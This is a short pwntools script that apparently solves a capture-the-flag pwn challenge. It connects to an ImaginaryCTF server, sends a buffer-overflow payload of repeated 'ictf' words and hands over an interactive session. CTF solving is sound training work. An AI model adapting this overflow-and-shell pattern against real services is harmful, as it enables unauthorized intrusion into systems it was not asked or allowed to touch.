from pwn import *
io = remote("chal.imaginaryctf.org",42001)
payload = p64(0x69637466)*(0x30//8)
io.sendline(payload)
io.interactive()
